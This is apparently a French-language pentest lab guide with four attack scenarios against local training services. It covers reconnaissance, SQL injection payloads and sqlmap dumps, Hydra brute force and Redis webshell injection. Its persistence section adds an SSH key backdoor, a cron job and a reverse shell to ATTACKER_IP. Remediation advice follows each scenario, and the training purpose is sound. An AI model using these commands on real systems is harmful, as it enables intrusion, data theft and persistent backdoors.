# 🎯 Scénarios d'Attaque - Lab Pentest

Ce document contient des scénarios d'attaque progressifs pour exploiter le lab de formation.

---

## 📘 Scénario 1 : Information Disclosure (Débutant)

**Durée estimée :** 30 minutes  
**Niveau :** Débutant  
**Objectif :** Découvrir des informations sensibles accessibles publiquement

### Contexte

Vous êtes un pentester externe qui vient de recevoir l'autorisation de tester l'infrastructure d'Acme Corp. Votre premier objectif est de collecter un maximum d'informations sans déclencher d'alertes.

### Étapes d'exploitation

#### 1. Reconnaissance initiale (10 min)

```bash
# Scanner les ports ouverts
nmap -sV -T4 localhost -p1-10000

# Résultat attendu :
# Port 8080 (BrokenCrystals)
# Port 8081 (DVWA)
# Port 8082 (Nginx)
# Port 21 (FTP)
# Port 2222 (SSH)
# Port 3306 (MySQL)
# Port 5432 (PostgreSQL)
# Port 6379 (Redis)
```

#### 2. Énumération web (10 min)

```bash
# Avec Nuclei (moderne, remplace Nikto)
nuclei -u http://localhost:8082

# Ou avec dirb (classique)
dirb http://localhost:8082 /usr/share/dirb/wordlists/common.txt

# Explorer manuellement
curl http://localhost:8082/
curl http://localhost:8082/secrets/
curl http://localhost:8082/backup/
```

#### 3. Exploitation (10 min)

**Action 1 : Télécharger le fichier credentials.txt**
```bash
curl http://localhost:8082/secrets/credentials.txt -o credentials.txt
cat credentials.txt
```

**Impact :** Vous obtenez tous les credentials de l'infrastructure !

**Action 2 : Récupérer le fichier de backup**
```bash
curl http://localhost:8082/config.php.bak -o config.php.bak
cat config.php.bak
```

**Impact :** Clés API, credentials de base de données, secrets JWT exposés !

### Questions de validation

1. Combien de services avez-vous découverts ?
2. Quels fichiers sensibles avez-vous trouvés ?
3. Combien de couples username/password avez-vous récupérés ?
4. Quelle est la clé API AWS exposée ?

### Recommandations de correction

- Désactiver le directory listing sur nginx
- Bloquer l'accès au dossier /secrets/
- Supprimer tous les fichiers .bak, .backup, .old
- Implémenter une authentification sur les zones sensibles

---

## 📙 Scénario 2 : SQL Injection to Database Dump (Débutant-Intermédiaire)

**Durée estimée :** 45 minutes  
**Niveau :** Débutant-Intermédiaire  
**Objectif :** Exploiter une SQLi pour dumper la base de données

### Contexte

Après la phase de reconnaissance, vous avez identifié une application web (DVWA) qui semble vulnérable aux injections SQL. Votre objectif est d'extraire les données sensibles.

### Étapes d'exploitation

#### 1. Identification de la vulnérabilité (10 min)

```bash
# Se connecter à DVWA
URL: http://localhost:8081
Login: admin
Password: password

# Aller dans "SQL Injection"
# Mettre le niveau à "low"

# Test manuel
User ID: 1' OR '1'='1
```

**Résultat attendu :** Toutes les entrées s'affichent

#### 2. Énumération avec SQLMap (15 min)

```bash
# D'abord, récupérer le cookie de session
# F12 > Application > Cookies > Copier PHPSESSID

# Énumérer les bases de données
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=VOTRE_SESSION_ICI; security=low" \
  --dbs

# Lister les tables
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=VOTRE_SESSION_ICI; security=low" \
  -D dvwa \
  --tables

# Dumper la table users
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=VOTRE_SESSION_ICI; security=low" \
  -D dvwa \
  -T users \
  --dump
```

#### 3. Exploitation manuelle avancée (20 min)

**Union-Based SQL Injection :**

```sql
-- Trouver le nombre de colonnes
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3-- (erreur = 2 colonnes)

-- Identifier les colonnes affichées
1' UNION SELECT null, null--
1' UNION SELECT 'test', 'test'--

-- Extraire les informations
1' UNION SELECT user(), database()--
1' UNION SELECT table_name, null FROM information_schema.tables--
1' UNION SELECT username, password FROM users--
```

### Exploitation du réseau interne

Une fois les credentials récupérés, vous pouvez accéder directement aux bases :

```bash
# MySQL
mysql -h localhost -P 3306 -u root -p
# Password: root

USE admin_db;
SHOW TABLES;
SELECT * FROM administrators;
SELECT * FROM confidential_documents;
SELECT * FROM payment_cards;  # ⚠️ Cartes de crédit en clair!

# PostgreSQL
psql -h localhost -p 5432 -U dbuser -d webapp
# Password: weak_password

\dt
SELECT * FROM users;
SELECT * FROM activity_logs;
```

### Questions de validation

1. Combien d'utilisateurs avez-vous extraits de DVWA ?
2. Quels sont les hashs de mots de passe récupérés ?
3. Quelles données sensibles avez-vous trouvées dans admin_db ?
4. Quel est l'impact métier de cette vulnérabilité ?

### Recommandations de correction

- Utiliser des requêtes préparées (prepared statements)
- Implémenter un WAF avec règles anti-SQLi
- Chiffrer les données sensibles au repos
- Ne JAMAIS stocker de numéros de cartes en clair

---

## 📕 Scénario 3 : Credential Stuffing et Accès FTP (Intermédiaire)

**Durée estimée :** 30 minutes  
**Niveau :** Intermédiaire  
**Objectif :** Utiliser les credentials trouvés pour accéder aux services internes

### Contexte

Vous avez récupéré plusieurs credentials depuis le fichier secrets/credentials.txt. Il est temps de les utiliser pour accéder aux services internes.

### Étapes d'exploitation

#### 1. Test des credentials FTP (10 min)

```bash
# Connexion avec les credentials trouvés
ftp localhost 21

Username: ftpuser
Password: ftp123

# Explorer le serveur
ls
cd backups
ls
cd ../shared
ls

# Récupérer les fichiers intéressants
get README.txt
cd backups
get backup_script.sh
bye

# Analyser le script
cat backup_script.sh
```

**Trouvailles :**
- Script de backup avec credentials
- Credentials PostgreSQL : dbuser / weak_password
- Credentials MySQL : root / root
- Credentials FTP dans le script

#### 2. Accès SSH (10 min)

```bash
# Connexion SSH avec credentials trouvés
ssh admin@localhost -p 2222
Password: admin123

# Une fois connecté, énumération
whoami
id
sudo -l
ls -la /home/admin
cat /home/admin/.bash_history

# Chercher des fichiers intéressants
find / -name "*.conf" 2>/dev/null | head -20
find / -name "*.txt" -user admin 2>/dev/null
```

#### 3. Brute Force avec Hydra (optionnel, 10 min)

Si vous n'aviez pas trouvé les credentials :

```bash
# Créer une wordlist simple
cat > passwords.txt << EOF
password
admin
admin123
password123
P@ssw0rd
EOF

# Brute force SSH
hydra -l admin -P passwords.txt ssh://localhost:2222

# Brute force FTP
hydra -l ftpuser -P passwords.txt ftp://localhost:21
```

### Questions de validation

1. Quels fichiers sensibles avez-vous trouvés sur le FTP ?
2. Quelles commandes pouvez-vous exécuter avec sudo ?
3. Combien de services utilisent le même mot de passe ?
4. Comment améliorer la sécurité FTP ?

### Recommandations de correction

- Implémenter des mots de passe forts et uniques
- Activer l'authentification par clé SSH (désactiver password auth)
- Désactiver le compte anonymous sur FTP
- Implémenter fail2ban pour bloquer les brute force
- Utiliser SFTP au lieu de FTP

---

## 📗 Scénario 4 : Post-Exploitation et Pivot (Avancé)

**Durée estimée :** 60 minutes  
**Niveau :** Avancé  
**Objectif :** Mouvement latéral et compromission complète

### Contexte

Vous avez accès à plusieurs services. L'objectif est maintenant de compromettre toute l'infrastructure et d'établir la persistance.

### Étapes d'exploitation

#### 1. Énumération depuis le SSH (20 min)

```bash
# Connexion SSH
ssh admin@localhost -p 2222

# Scanner le réseau interne
nmap -sn 172.21.0.0/24

# Scanner les services internes
nmap -sV 172.21.0.20  # PostgreSQL
nmap -sV 172.21.0.21  # MySQL
nmap -sV 172.21.0.40  # Redis

# Tester l'accès réseau
nc -zv 172.21.0.20 5432
nc -zv 172.21.0.40 6379
```

#### 2. Exploitation de Redis (15 min)

```bash
# Depuis la machine SSH ou depuis Kali
redis-cli -h localhost -p 6379 -a redis123

# Énumération
INFO
CONFIG GET *

# Lister les clés
KEYS *

# Dump des sessions
GET session:*

# Injection de données malveillantes
SET malicious:key "<?php system($_GET['cmd']); ?>"

# Tentative de RCE via module loading (si non patché)
MODULE LOAD /path/to/evil.so
```

#### 3. Pivoting vers les bases de données (15 min)

```bash
# PostgreSQL - Extraction complète
psql -h localhost -p 5432 -U dbuser -d webapp

-- Lister toutes les tables
\dt

-- Dump de toutes les données
\copy (SELECT * FROM users) TO '/tmp/users.csv' CSV HEADER;
\copy (SELECT * FROM products) TO '/tmp/products.csv' CSV HEADER;

-- Chercher des données sensibles
SELECT * FROM users WHERE role = 'admin';
SELECT * FROM activity_logs ORDER BY created_at DESC LIMIT 100;

# MySQL - Extraction des données sensibles
mysql -h localhost -P 3306 -u root -p

-- Données critiques
USE admin_db;
SELECT * FROM confidential_documents;
SELECT * FROM payment_cards;
SELECT username, password FROM administrators;
```

#### 4. Persistance et Backdoor (10 min)

```bash
# Depuis le SSH
ssh admin@localhost -p 2222

# Créer une backdoor SSH
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys

# Créer un cron job malveillant
(crontab -l ; echo "*/5 * * * * /tmp/backdoor.sh") | crontab -

# Script de reverse shell
cat > /tmp/backdoor.sh << 'EOF'
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
EOF
chmod +x /tmp/backdoor.sh

# Ajouter un utilisateur avec privilèges
sudo useradd -m -s /bin/bash hacker
sudo usermod -aG sudo hacker
```

### Chaîne d'attaque complète

```
1. Reconnaissance web → Découverte de credentials.txt
2. Information Disclosure → Récupération de tous les credentials
3. Accès FTP → Récupération du script backup avec credentials DB
4. SQL Injection → Dump des bases de données DVWA
5. Accès SSH → Énumération du réseau interne
6. Pivot PostgreSQL → Extraction données webapp
7. Pivot MySQL → Extraction données confidentielles + cartes de crédit
8. Exploitation Redis → Manipulation de sessions
9. Persistance → Backdoor SSH + cron job
10. Exfiltration → Toutes les données sensibles récupérées
```

### Impact Métier

**Confidentialité :**
- ✅ Toutes les données utilisateurs compromises
- ✅ Cartes de crédit en clair exposées
- ✅ Documents confidentiels accédés
- ✅ Credentials de toute l'infrastructure exposés

**Intégrité :**
- ✅ Possibilité de modifier les bases de données
- ✅ Injection de données malveillantes dans Redis
- ✅ Modification des fichiers de configuration

**Disponibilité :**
- ✅ Possibilité de DoS sur tous les services
- ✅ Possibilité de corrompre les backups
- ✅ Destruction possible des données

**Conformité :**
- ❌ Non-conformité RGPD (données non chiffrées)
- ❌ Non-conformité PCI-DSS (cartes en clair)
- ❌ Absence de journalisation des accès

### Questions de validation

1. Combien de systèmes avez-vous compromis au total ?
2. Quelle est la donnée la plus sensible trouvée ?
3. Combien de vecteurs d'attaque différents avez-vous utilisés ?
4. Comment documenter cette chaîne d'attaque dans un rapport ?

### Recommandations prioritaires

**P0 - Critique (corriger immédiatement) :**
- Supprimer le fichier credentials.txt exposé
- Changer TOUS les mots de passe
- Chiffrer les cartes de crédit ou migrer vers tokenization
- Corriger les SQL Injections avec prepared statements

**P1 - Important (corriger sous 1 semaine) :**
- Implémenter un WAF (ModSecurity)
- Activer le chiffrement des données au repos
- Implémenter fail2ban sur SSH/FTP
- Segmenter le réseau (DMZ / Interne strict)

**P2 - Moyen (corriger sous 1 mois) :**
- Audit complet des configurations
- Implémenter un SIEM pour la détection
- Formation des développeurs au secure coding
- Tests de pénétration réguliers

---

## 📊 Tableau Récapitulatif des Vulnérabilités

| Service | Vulnérabilité | Sévérité | Temps Exploit | Compétence |
|---------|---------------|----------|---------------|------------|
| Nginx | Directory Listing | Moyen | 5 min | Débutant |
| Nginx | Sensitive Files | Critique | 5 min | Débutant |
| DVWA | SQL Injection | Critique | 15 min | Débutant |
| DVWA | XSS | Moyen | 10 min | Débutant |
| BrokenCrystals | JWT Issues | Élevé | 20 min | Intermédiaire |
| BrokenCrystals | GraphQL Introspection | Moyen | 10 min | Intermédiaire |
| FTP | Weak Credentials | Élevé | 5 min | Débutant |
| SSH | Weak Credentials | Élevé | 5 min | Débutant |
| PostgreSQL | Weak Credentials | Critique | 2 min | Débutant |
| MySQL | Weak Credentials | Critique | 2 min | Débutant |
| MySQL | Plaintext CC | Critique | 5 min | Débutant |
| Redis | Weak Auth | Moyen | 5 min | Intermédiaire |
| Réseau | Pas de Segmentation | Élevé | N/A | Intermédiaire |

---

## 🎓 Conseils Pédagogiques

### Pour les Débutants
- Commencez par le Scénario 1 (Information Disclosure)
- Prenez le temps de comprendre chaque étape
- Documentez tout ce que vous trouvez
- Essayez d'abord manuellement avant d'utiliser des outils automatiques

### Pour les Intermédiaires
- Essayez d'enchaîner les Scénarios 1, 2 et 3
- Expérimentez avec différents outils (SQLMap, Hydra, etc.)
- Pratiquez la documentation professionnelle
- Créez vos propres payloads

### Pour les Avancés
- Réalisez le Scénario 4 complet
- Essayez de trouver des vulnérabilités non documentées
- Pratiquez la rédaction de rapport complet
- Créez vos propres scénarios d'attaque

---

**Note Finale :** Ce lab est un environnement sûr pour apprendre. N'hésitez pas à tout casser et à recommencer. C'est en pratiquant qu'on apprend ! 🚀
